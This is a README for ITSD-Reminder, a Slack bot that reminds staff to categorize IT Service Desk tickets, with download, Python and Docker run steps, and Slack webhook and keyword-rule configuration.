# 🤖 ITSD-Reminder - Seamless Ticket Management Automation

![Download ITSD-Reminder](https://img.shields.io/badge/Download-ITSD--Reminder-blue?style=flat-square&logo=github)

## 🚀 Getting Started

Welcome to ITSD-Reminder! This is a Slack bot that automates reminders for categorizing IT Service Desk tickets. It is Docker-ready and includes smart duplicate prevention features. This guide will help you download and run the application smoothly.

## 📥 Download & Install

To start using ITSD-Reminder, visit this page to download: [Releases Page](https://github.com/khantzinhein007/ITSD-Reminder/releases).

Here’s how to download and set it up:

1. Click on the **Releases Page** link above.
2. Look for the latest release at the top.
3. Download the version that suits your operating system.

## ⚙️ System Requirements

Before you download, ensure your system meets these requirements:

- **Operating System:** Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
- **Python Version:** Python 3.6 or later is recommended for running additional scripts.
- **Docker:** If using Docker, please ensure you have Docker Desktop installed on your machine.

## 📂 How to Run ITSD-Reminder

After downloading, follow these steps to run the application:

### For Non-Docker Users:

1. Extract the downloaded files to a desired directory.
2. Open your command prompt or terminal.
3. Navigate to the folder where you extracted ITSD-Reminder.
4. Run the application by executing:

   ```bash
   python main.py
   ```

### For Docker Users:

1. Ensure Docker Desktop is running.
2. Open a command prompt or terminal.
3. Pull the ITSD-Reminder Docker image:

   ```bash
   docker pull khantzinhein007/itsd-reminder
   ```

4. Run the Docker container:

   ```bash
   docker run -d -p 8080:8080 khantzinhein007/itsd-reminder
   ```

5. Access the application in your web browser at `http://localhost:8080`.

## 🔑 Configuration

### Slack Integration

To link ITSD-Reminder to your Slack workspace, follow these steps:

1. Go to your Slack workspace and create an app at [Slack API](https://api.slack.com/apps).
2. Enable Incoming Webhooks and generate a new webhook URL.
3. Update your `config.json` file inside the application directory with the following:

   ```json
   {
     "slack_webhook_url": "YOUR_SLACK_WEBHOOK_URL"
   }
   ```

### Ticket Categorization Logic

You can customize how ITSD-Reminder categorizes tickets. Edit the `category_rules.json` file to add or modify rules. For example:

```json
{
  "rules": [
    {
      "keyword": "urgent",
      "category": "Priority 1"
    }
  ]
}
```

ITSD-Reminder uses these rules to remind users about categorizing their tickets in Slack.

## 🔄 Updating ITSD-Reminder

To keep your ITSD-Reminder updated, check the Releases page regularly. Follow the same download instructions for any new version.

## ❓ Troubleshooting

If you encounter issues, consider these tips:

- Ensure your Python or Docker installation is working correctly.
- Verify your Slack token is valid.
- Check your internet connection.

For common issues, you can also refer to the FAQ section in the repository.

## 🔗 Learn More

For more detailed information about using ITSD-Reminder, visit the [documentation page](https://github.com/khantzinhein007/ITSD-Reminder/wiki).

## 📬 Feedback and Support

For feedback, feature requests, or support, open an issue on the [GitHub repository](https://github.com/khantzinhein007/ITSD-Reminder/issues). Your input helps us improve.

## 🚀 Contributing

Interested in contributing? We welcome your suggestions. Please read the contributing guidelines before submitting changes.

## 💼 License

This project is licensed under the MIT License. See the LICENSE file for more details.

Thank you for using ITSD-Reminder! To start, visit this page to download: [Releases Page](https://github.com/khantzinhein007/ITSD-Reminder/releases).